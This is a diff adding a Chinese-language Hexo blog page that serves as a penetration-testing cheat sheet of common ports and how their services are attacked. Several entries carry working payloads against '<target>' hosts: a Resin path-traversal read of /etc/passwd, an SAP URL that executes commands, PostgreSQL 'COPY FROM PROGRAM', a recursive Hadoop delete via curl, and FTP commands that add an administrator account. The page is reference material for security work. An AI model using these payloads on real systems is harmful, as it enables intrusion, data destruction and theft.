@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ctzsb.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="1、远程管理端口 22 端口（SSH） 1234安全攻击：弱口令、暴力猜解、用户名枚举利用方式：1、通过用户名枚举可以判断某个用户名是否存在于目标主机中，2、利用弱口令&#x2F;暴力破解，获取目标主机权限。  23 端口（Telnet） 1234安全漏洞：弱口令、明文传输利用方式：1、通过弱口令或暴力破解，获取目标主机权限。2、嗅探抓取telnet明文账户密码。  3389 端口（RDP） 12安全漏洞：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见端口服务以及漏洞利用">
+<meta property="og:url" content="http://ctzsb.top/2023/10/10/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Ctz">
+<meta property="og:description" content="1、远程管理端口 22 端口（SSH） 1234安全攻击：弱口令、暴力猜解、用户名枚举利用方式：1、通过用户名枚举可以判断某个用户名是否存在于目标主机中，2、利用弱口令&#x2F;暴力破解，获取目标主机权限。  23 端口（Telnet） 1234安全漏洞：弱口令、明文传输利用方式：1、通过弱口令或暴力破解，获取目标主机权限。2、嗅探抓取telnet明文账户密码。  3389 端口（RDP） 12安全漏洞：">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-10-10T11:46:19.000Z">
+<meta property="article:modified_time" content="2023-10-10T11:52:26.419Z">
+<meta property="article:author" content="SB">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://ctzsb.top/2023/10/10/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>常见端口服务以及漏洞利用 | Ctz</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ctz</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://ctzsb.top/2023/10/10/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="SB">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ctz">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          常见端口服务以及漏洞利用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-10-10 19:46:19 / Modified: 19:52:26" itemprop="dateCreated datePublished" datetime="2023-10-10T19:46:19+08:00">2023-10-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>1、远程管理端口</strong></p>
+<p><strong>22 端口（SSH）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全攻击：弱口令、暴力猜解、用户名枚举</span><br><span class="line">利用方式：</span><br><span class="line">1、通过用户名枚举可以判断某个用户名是否存在于目标主机中，</span><br><span class="line">2、利用弱口令/暴力破解，获取目标主机权限。</span><br></pre></td></tr></table></figure>
+
+<p><strong>23 端口（Telnet）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：弱口令、明文传输</span><br><span class="line">利用方式：</span><br><span class="line">1、通过弱口令或暴力破解，获取目标主机权限。</span><br><span class="line">2、嗅探抓取telnet明文账户密码。</span><br></pre></td></tr></table></figure>
+
+<p><strong>3389 端口（RDP）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：暴力破解</span><br><span class="line">利用方式：通过弱口令或暴力破解，获取目标主机权限。</span><br></pre></td></tr></table></figure>
+
+<p><strong>5632 端口（Pcanywhere）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：弱口令、暴力破解</span><br><span class="line">利用方式：通过弱口令或暴力破解，获取目标主机权限</span><br></pre></td></tr></table></figure>
+
+<p><strong>5900 端口（VNC）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：弱口令、暴力破解</span><br><span class="line">利用方式：通过弱口令或暴力破解，获取目标主机权限。</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、Web中间件&#x2F;服务端口</strong></p>
+<p><strong>1090&#x2F;1099 端口（RMI）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：JAVA RMI 反序列化远程命令执行漏洞</span><br><span class="line">利用方式：使用nmap检测端口信息。</span><br><span class="line">端口信息：1099/1090    Java-rmi    Java RMI Registry</span><br><span class="line">检测工具：attackRMI.jar</span><br></pre></td></tr></table></figure>
+
+<p><strong>7001 端口（Weblogic）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：弱口令、SSRF、反序列化漏洞</span><br><span class="line">利用方式：</span><br><span class="line">1、控制台弱口令上传war木马 </span><br><span class="line">2、SSRF内网探测 </span><br><span class="line">3、反序列化远程代码执行等</span><br></pre></td></tr></table></figure>
+
+<p><strong>8000 端口（jdwp）</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：<span class="variable constant_">JDWP</span> 远程命令执行漏洞</span><br><span class="line">端口信息：</span><br><span class="line">      <span class="number">8000</span>             jdwp           java <span class="title class_">Debug</span> <span class="title class_">Wire</span> <span class="title class_">Protocol</span></span><br><span class="line">检测工具：<span class="attr">https</span>:<span class="comment">//github.com/IOActive/jdwp-shellifier</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>8080 端口（Tomcat）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：弱口令、示例目录</span><br><span class="line">利用方式：通过弱口令登录控制台，上传war包。</span><br></pre></td></tr></table></figure>
+
+<p><strong>8080 端口（Jboss）</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：未授权访问、反序列化。</span><br><span class="line">利用方式：</span><br><span class="line"><span class="number">1</span>、未授权访问控制台，远程部署木马</span><br><span class="line"><span class="number">2</span>、反序列化导致远程命令执行等。</span><br><span class="line">检测工具：<span class="attr">https</span>:<span class="comment">//github.com/joaomatosf/jexboss</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>8080 端口（Resin）</strong></p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：目录遍历、远程文件读取</span><br><span class="line">利用方式：通过目录遍历/远程文件读取获取敏感信息，为进一步攻击提供必要的信息。</span><br><span class="line"></span><br><span class="line">任意文件读取POC：</span><br><span class="line">payload1 = <span class="string">&quot;/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;/resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../../../../../etc/passwd&quot;</span></span><br><span class="line">payload3 = <span class="string">&quot;/ ..\\\\web-inf&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>8080 端口（Jetty）</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：远程共享缓冲区泄漏</span><br><span class="line">利用方式：攻击者可以通过精心构造headers值来触发异常并偏移到共享缓冲区，其中包含了之前其他用户提交的请求，服务器会根据攻击者的payload返回特定位置的数据。</span><br><span class="line">检测工具：<span class="attr">https</span>:<span class="comment">//github.com/GDSSecurity/Jetleak-Testing-Script</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>8080 端口（GlassFish）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：弱口令、任意文件读取</span><br><span class="line">利用方式：</span><br><span class="line">1、弱口令admin/admin，直接部署shell </span><br><span class="line">2、任意文件读取获取服务器敏感配置信息</span><br></pre></td></tr></table></figure>
+
+<p><strong>8080 端口（Jenkins）</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：未授权访问 、远程代码执行</span><br><span class="line">利用方式：访问如下url，可以执行脚本命令，反弹shell，写入webshell等。</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//&lt;target&gt;:8080/manage</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//&lt;target&gt;:8080/script</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>8161 端口（ActiveMQ）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：弱口令、任意文件写入、反序列化</span><br><span class="line">利用方式：默认密码admin/admin登陆控制台、写入webshell、上传ssh key等方式。</span><br></pre></td></tr></table></figure>
+
+<p><strong>9043 端口（webSphere）</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：控制台弱口令、远程代码执行</span><br><span class="line">后台地址：<span class="symbol">https:</span>/<span class="regexp">/:9043/ibm</span><span class="regexp">/console/logon</span>.jsp</span><br></pre></td></tr></table></figure>
+
+<p><strong>50000 端口 （SAP）</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：远程代码执行</span><br><span class="line">利用方式：攻击者通过构造url请求，实现远程代码执行。</span><br><span class="line"><span class="variable constant_">POC</span><span class="symbol">:http</span><span class="symbol">://&lt;target&gt;</span><span class="symbol">:</span><span class="number">50000</span>/ctc/servlet/com.sap.ctc.util.<span class="title class_">ConfigServlet</span>?param=com.sap.ctc.util.<span class="title class_">FileSystemConfig</span>;<span class="variable constant_">EXECUTE_CMD</span>;<span class="variable constant_">CMDLINE</span>=cmd.exe /c ipconfig /all</span><br></pre></td></tr></table></figure>
+
+<p><strong>50070 端口（hadoop）</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：未授权访问</span><br><span class="line">利用方式：攻击者可以通过命令行操作多个目录下的数据，如进行删除操作。</span><br><span class="line">curl <span class="operator">-</span>i <span class="operator">-</span>X <span class="keyword">DELETE</span> “http:<span class="operator">/</span><span class="operator">/</span>ip:<span class="number">50070</span><span class="operator">/</span>webhdfs<span class="operator">/</span>v1<span class="operator">/</span>tmp?op<span class="operator">=</span><span class="keyword">DELETE</span><span class="operator">&amp;</span><span class="keyword">recursive</span><span class="operator">=</span><span class="literal">true</span>“</span><br><span class="line">curl <span class="operator">-</span>i <span class="operator">-</span>X PUT “http:<span class="operator">/</span><span class="operator">/</span>ip:<span class="number">50070</span><span class="operator">/</span>webhdfs<span class="operator">/</span>v1<span class="operator">/</span>NODATA4U_SECUREYOURSHIT?op<span class="operator">=</span>MKDIRS“</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、数据库端口</strong></p>
+<p><strong>389 端口（ldap）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：未授权访问 、弱口令</span><br><span class="line">利用方式：通过LdapBrowser工具直接连入。</span><br><span class="line">UNDEFINED 复制 全屏</span><br></pre></td></tr></table></figure>
+
+<p><strong>1433 端口（Mssql）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：弱口令、暴力破解</span><br><span class="line">利用方式：差异备份getshell、SA账户提权等</span><br></pre></td></tr></table></figure>
+
+<p><strong>1521 端口（Oracle）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：弱口令、暴力破解</span><br><span class="line">利用方式：通过弱口令/暴力破解进行入侵。</span><br></pre></td></tr></table></figure>
+
+<p><strong>3306 端口（MySQL）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：弱口令、暴力破解</span><br><span class="line">利用方式：利用日志写入webshell、udf提权、mof提权等。</span><br></pre></td></tr></table></figure>
+
+<p><strong>5432 端口（ PostgreSQL）</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：弱口令、高权限命令执行</span><br><span class="line">利用方式：攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令。</span><br><span class="line">PoC参考：</span><br><span class="line">    <span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> cmd_exec;</span><br><span class="line">    <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> cmd_exec(cmd_output text);</span><br><span class="line">    <span class="keyword">COPY</span> cmd_exec <span class="keyword">FROM</span> PROGRAM <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> cmd_exec;</span><br></pre></td></tr></table></figure>
+
+<p><strong>5984 端口（CouchDB）</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：垂直权限绕过、任意命令执行</span><br><span class="line">利用方式：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。</span><br><span class="line">后台访问：<span class="attr">http</span>:<span class="comment">//&lt;target&gt;:5984/_utils</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>6379 端口（Redis）</strong></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：未授权访问</span><br><span class="line">利用方式：绝对路径写webshell 、利用计划任务执行命令反弹<span class="keyword">shell、</span></span><br><span class="line"><span class="keyword"></span>公私钥认证获取root权限、主从复制RCE等。</span><br></pre></td></tr></table></figure>
+
+<p><strong>9200 端口（elasticsearch）</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：未授权访问、命令执行</span><br><span class="line">检测方式：</span><br><span class="line"><span class="number">1</span>、直接访问如下url，获取相关敏感信息。</span><br><span class="line">  <span class="attr">http</span>:<span class="comment">//&lt;target&gt;:9200/_nodes  </span></span><br><span class="line">查看节点数据</span><br><span class="line">  <span class="attr">http</span>:<span class="comment">//&lt;target&gt;:9200/_river  查看数据库敏感信息</span></span><br><span class="line"><span class="number">2</span>、通过构造特定的数据包，执行任意命令。</span><br></pre></td></tr></table></figure>
+
+<p><strong>11211 端口（MemCache）</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：未授权访问</span><br><span class="line">检测方式：无需用户名密码，可以直接连接memcache 服务的11211端口。</span><br><span class="line">nc -vv <span class="tag">&lt;<span class="name">target</span>&gt;</span> 11211</span><br></pre></td></tr></table></figure>
+
+<p><strong>27017 端口（Mongodb）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：未授权访问、弱口令</span><br><span class="line">利用方式：未授权访问/弱口令，远程连入数据库，导致敏感信息泄露。</span><br></pre></td></tr></table></figure>
+
+<p><strong>4、常见协议端口</strong></p>
+<p><strong>21 端口（FTP)</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：1、配置不当    2、明文传输    3、第三方软件提权</span><br><span class="line">利用方式：</span><br><span class="line">1、匿名登录或弱口令</span><br><span class="line">2、嗅探ftp用户名和密码</span><br><span class="line">3、Serv-U权限较大的账号可导致系统命令执行。</span><br><span class="line">FTP提权命令：</span><br><span class="line">  <span class="comment"># 增加系统用户</span></span><br><span class="line">   Quote site <span class="built_in">exec</span> net user 4567 4567 /add</span><br><span class="line">  <span class="comment"># 提升到管理员权限</span></span><br><span class="line">   Quote site <span class="built_in">exec</span> net localgroup administrators 4567 /add</span><br></pre></td></tr></table></figure>
+
+<p><strong>25 端口（SMTP）</strong></p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">攻击方式：<span class="number">1</span>、匿名发送邮件 <span class="number">2</span>、弱口令 <span class="number">3</span>、SMTP用户枚举</span><br><span class="line">利用方式：</span><br><span class="line"><span class="number">1</span>、SMTP服务器配置不当，攻击者可以使用任意用户发送邮件。</span><br><span class="line"><span class="number">2</span>、SMTP弱口令扫描，获取用户账号密码，发送邮件钓鱼。</span><br><span class="line"><span class="number">3</span>、通过SMTP用户枚举获取用户名：</span><br><span class="line">   nmap -p <span class="number">25</span> -- smtp-<span class="built_in">enum</span>-users.nse &lt;target&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>53 端口（DNS）</strong></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安全攻击：<span class="number">1</span>、DNS域传送漏洞、DNS欺骗、DNS缓存投毒</span><br><span class="line">检测方式：</span><br><span class="line"><span class="number">1</span>、DNS域传送漏洞，Windows下检测使用nslookup命令，Linux下检测使用<span class="keyword">dig命令，通过执行命令可以清楚的看到域名解析情况。</span></span><br><span class="line"><span class="keyword"></span><span class="number">2</span>、DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。</span><br><span class="line"><span class="number">3</span>、DNS缓存投毒是攻击者欺骗DNS服务器相信伪造的DNS响应的真实性。</span><br></pre></td></tr></table></figure>
+
+<p><strong>161 端口（SNMP）</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：默认团体名/弱口令访问</span><br><span class="line">利用方式：通过nmap自带的审计脚本进行检测，可能导致敏感信息泄露。。</span><br><span class="line">1、弱口令检测：nmap –sU –p161 –script=snmp-brute <span class="tag">&lt;<span class="name">target</span>&gt;</span></span><br><span class="line">2、获取系统信息：nmap –sU –p161 –script=snmp-sysdescr <span class="tag">&lt;<span class="name">target</span>&gt;</span></span><br><span class="line">3、获取用户信息：nmap -sU -p161 --script=snmp-win32-user <span class="tag">&lt;<span class="name">target</span>&gt;</span></span><br><span class="line">4、获取网络端口状态：nmap -sU -p161 --script=snmp-netstat <span class="tag">&lt;<span class="name">target</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>443 端口（SSL）</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：OpenSSL 心脏出血</span><br><span class="line">利用方式：攻击者可以远程读取存在漏洞版本的openssl服务器内存中长大64K的数据。</span><br><span class="line">扫描脚本：nmap -sV --script=ssl-heartbleed <span class="tag">&lt;<span class="name">target</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>445 端口（SMB）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：信息泄露、远程代码执行</span><br><span class="line">利用方式：可利用共享获取敏感信息、缓冲区溢出导致远程代码执行，如ms17010。</span><br></pre></td></tr></table></figure>
+
+<p><strong>873 端口（Rsync）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：匿名访问、弱口令</span><br><span class="line">利用方式：攻击者可以执行下载/上传等操作，也可以尝试上传webshell。</span><br><span class="line">1、下载：<span class="comment">#rsync -avz a.b.c.d::path/file path/filiname  </span></span><br><span class="line">2、上传：<span class="comment">#rsync -avz path/filename a.b.c.d::path/file</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>2181 端口（Zookeeper）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：未授权访问</span><br><span class="line">检测方式：攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。</span><br><span class="line"> <span class="built_in">echo</span> envi | nc ip port</span><br></pre></td></tr></table></figure>
+
+<p><strong>2375 端口（Docker）</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：未授权方式</span><br><span class="line">检测方式：通过docker daemon api 执行docker命令。</span><br><span class="line"><span class="comment">#列出容器信息，效果与docker ps -a 一致。</span></span><br><span class="line"> </span><br><span class="line">curl http:<span class="comment">//&lt;target&gt;:2375/containers/json</span></span><br><span class="line"> </span><br><span class="line">docker -H tcp:<span class="comment">//&lt;target&gt;:2375 start &lt;Container Id&gt;</span></span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/09/26/%E9%9D%A2%E8%AF%95%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="prev" title="面试题记录">
+      <i class="fa fa-chevron-left"></i> 面试题记录
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
